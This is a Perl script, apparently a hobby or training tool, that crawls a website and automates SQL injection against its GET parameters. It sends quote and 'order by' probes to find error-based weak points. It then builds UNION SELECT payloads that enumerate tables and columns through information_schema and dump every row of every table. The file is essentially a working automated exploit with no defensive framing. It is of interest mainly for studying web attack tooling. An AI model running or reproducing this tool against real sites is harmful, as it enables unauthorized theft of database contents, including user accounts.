#!/usr/bin/perl
use warnings;
use strict;
use threads;
use WWW::Mechanize;
use Thread::Queue;
use URI;
use 5.010;

require("/root/git/webvulnerability/fns.pl");

my @urls; 
my @links;
my @form;
my %urls_done; #crawl 한 모든 utl
my %urls_keyword; #host 가 포함된 rul
my %urls_sql_form; #Form request sql weak ponit
my %urls_sql_url; #GET request sql weak point

my $count;
my ($content,$values); #응답값
my ($string_field,$field_number); 

my @union_query; #union 쿼리
my ($tag1,$tag2,$tag1_index,$tag2_index);

my (@tables,%table_info);
my (@fields,%field_info);

my (@new_field_value,@field_values,@new_field_name);

my $url = shift || "Please provide an initial source URL";
my $max_depth = shift || 1;
my $depth=0;
my $keyword = (split /:\/\//, $url)[1]; #host filter
my $mech = WWW::Mechanize->new();

eval{$mech->get($url)};
$urls_done{$url}=1;
#@form = $mech->forms; #현재 페이지의 모든 form 정보를 가져온다.
#for (@form)
#{
#	next unless $_->action =~ /$keyword/;
#	my $form_action = $_->action; #form 으로 넘겨지는 주소
#	my $form_name = $_->attr('name'); #form name 
#	my $form_method = $_->method; #form method
#	my @form_text_name; #form 안에 존재하는 text names 을 저장하는 배열 변수
#	my @inputs = $_->inputs; #form의 정보를 반환
#	for (@inputs) #type 가 text 것만 @form_text_name 배열에 저장
#	{
#		next unless $_->type eq 'text';
#		push @form_text_name, $_->name;
#	}
#	$urls_sql_form{$url} = join ' ', $form_action, $form_name, $form_method, @form_text_name; #key : url, value : form_action form_name form_method form_text_name(공백으로 구분)
#}

@links = $mech->find_all_links; #현재 페이지의 모든 링크를 가져온다.
for my $link (@links)
{
	my $url = $link->url_abs(); #링크의 절대 주소를 저장하여 배열에 삽입
	push @urls, $url;
}

my $queue = new Thread::Queue(@urls); #@urls 인자값으로 Queue 객체 생성
$queue->enqueue('--');  #맨 뒤에 -- 구분자 삽입

while($queue->pending()>0 and $max_depth>$depth)
{
	my $url = $queue->dequeue; #queue 에서 값 하나를 빼서 반환
	if ($url eq '--')
	{
		$depth++;
		$queue->enqueue('--');
		next;
	}
	next if $urls_done{$url};
	$urls_done{$url}=1;

#if($max_depth-1>$depth) #max_depth가 1일때는 if문 안의 코드를 굳이 실행할 필요가 없어서 해당 조건 생성
#	{
		eval{$mech->get($url)}; # 67~91 라인까지 24~48 라인과 동일한 구문
#		@form = $mech->forms;
#		for (@form)
#		{
#			next unless $_->action =~ /$keyword/;
#			my $form_action = $_->action;
#			my $form_name = $_->attr('name');
#			my $form_method = $_->method;
#			my @form_text_name;
#			my @inputs = $_->inputs;
#			for (@inputs)
#				{
#					next unless $_->type eq 'text';
#					push @form_text_name, $_->name;
#				}
#		$urls_sql_form{$url} = join ' ', $form_action, $form_name, $form_method, @form_text_name;
#		}
		@links = $mech->find_all_links;
		for my $link (@links)
		{
			my $url = $link->url_abs();
			next if $urls_done{$url};
			$queue->enqueue($url);
		}
#	}
}
for my $url (keys %urls_done)
{
	next unless $url =~ /$keyword/;
	$urls_keyword{$url}=1;
}

# GET repuset 에 매개변수가 존재하는 URL 필터링
for my $url (keys %urls_keyword)
{
	my $uri = URI->new($url);	
	my $query = $uri->query;
	next unless $query;
	$urls_sql_url{$url}= $query; #key : url, value : 매개변수와 값(ex: a=1&b=2)
}

# 매개변수 존재하는 URL 대상으로 GET request sql weak ponit 쿼리 작성
for my $url(keys %urls_sql_url)
{
	my $abs_url = $url;
	$abs_url =~ s/=/='TEST/g;
	
	eval{ $mech->get($abs_url) }; #수정된 url로 접근
	my $response = $mech->response; #접근한 응답객체 반환
	my $content = $response->decoded_content; #응답페이지 내용 반환
	if($content =~ /(Microsoft SQL|MySQL|ORA)/i) #응답페이지 내용에 해당 문자가 있으면)
	{
		$urls_sql_url{$url} = $1;
	}
	else #없으면
	{
		delete $urls_sql_url{$url};
	}
}

# 폼이 존재하는 URL 대상으로 Form SQL waak ponit 쿼리 작성
#for (keys %urls_sql_form)
#{
#	my $fields_query; 
#	my ($action_url, $form_name, $form_method, @form_text_name) = 
#		split ' ', $urls_sql_form{$_};
#	for (@form_text_name) #submit_form 함수에 넣을 변수 $fields_query 설정
#	{
#		$fields_query .= "$_ => \"'TEST\", ";
#	}
#	$mech->get($_);
#
#`my $response = $mech->submit_form(
#		form_name => $form_name,
#		fields =>
#		{
#			1 => 1,
#		}
#	);
#	my $content = $response->content;
#	if($content =~ /(Microsoft|MySQL|ORA)/i)
#	{
#		$urls_sql_form{$_} = $1;
#	}
#	else
#	{
#		delete $urls_sql_form{$_};
#	}
#}


#GET, Form 기반 sql weak point 출력
#for (keys %urls_sql_form)
#{
#	say "$_\n\t$urls_sql_form{$_}";
#}

for my $url (keys %urls_sql_url)
{
	say $url;
	$count=1;
	while(1)
	{
		eval{$mech->get($url.' order by '.$count)};
		$content=$mech->response->decoded_content;
		if($content=~/error/i)
		{
			$field_number=$count-1;
			last;
		}
		$count++;
		last if $count>20;
	}
	next if $count>20;
	say "\tfield number : $field_number\n\tDB name : $urls_sql_url{$url}";
	my $query='null';
	$query.=',null' x ($field_number-1);

	for (my $i=0; $i<$field_number; $i++)
	{
		my $copy_query=$query;
		substr($copy_query, $i*5, 4) = "'77777'";
		$copy_query = ' union select '.$copy_query;
		push @union_query, $copy_query;
	}
	$count=1;
	for (@union_query)
	{
		eval{$mech->get($url.$_)};
		$content=$mech->response->decoded_content;

		if($content=~/(<\/?\s*\w*\s*\w*=?"?\w*"?>)\s*77777\s*(<\/\w*>)/)
		{
			$tag1=$1;$tag2=$2;
			$tag1=~s/\s//g;$tag2=~s/\s//g;
			$string_field=$count; #문자열 필드 넘버 저장
			$content=~s/\s//g;

			$tag1_index=index($content, $tag1.'77777');
			$tag2_index=index($content, $tag2, $tag1_index);

			last;
		}
		$count++;
	}
	$query=$union_query[$count-1];

	$query=if_dbname($urls_sql_url{$url},$query);
	$values=get_values($mech,$url,$query,$tag1,$tag2,$tag1_index);
	say "account : $values";

  $query=$union_query[$string_field-1]." from information_schema.tables where table_schema=database()";
  $query=~s/'77777'/group_concat(table_name)/;

	$values=get_values($mech,$url,$query,$tag1,$tag2,$tag1_index);
  @tables=split(/,/,$values);

for my $table_name (@tables)
{
  $query=$union_query[$string_field-1]." from information_schema.columns where table_name='$table_name'";
	$query=~s/'77777'/group_concat(column_name)/;
		
	$values=get_values($mech,$url,$query,$tag1,$tag2,$tag1_index);
	$table_info{$table_name}=$values;
}

say "[Table&Field Information]";
while( (my $key, my $value)=each %table_info) #key:테이블 $value: 칼럼 
{
	say "$key: $value";
}

while((my $table, my $field_name)=each %table_info) #key:테이블 $value: 칼럼
{	
	say "[table: $table]";
	@fields=split(/,/,$field_name); #,로 나눠서 배열에 저장
  for my $field_name (@fields)
	{
		$query=$union_query[$string_field-1]." from $table";
		$query=~s/'77777'/group_concat($field_name,\'---\')/;

	  $values=get_values($mech,$url,$query,$tag1,$tag2,$tag1_index);
		
		if ($values =~ /</ || $values eq '')
		{
			say "$field_name에 아무런 데이터가 없음";
		}
    else
		{
			$field_info{$field_name}=$values;
			push @new_field_name,$field_name;
			@field_values=split(/---,?/,$values);
			push @new_field_value,@field_values;
			push @new_field_value,"//";
		}
	}

	say "@new_field_name";
	$count=0;	
	for my $field_value(@new_field_value)
  {
		last if $field_value eq "//";
		$count++;
	}	

	for (my $i=0; $i<$count; $i++)
	{
		for (my $j=0; $j<($#new_field_name+1); $j++)
		{
			print "$new_field_value[$i+($j*($count+1))] ";		
		}		
		say '';	
	}
	
	@fields=();
	%field_info=();
	@new_field_value=();
  @new_field_name=();
	say '';
 }
}
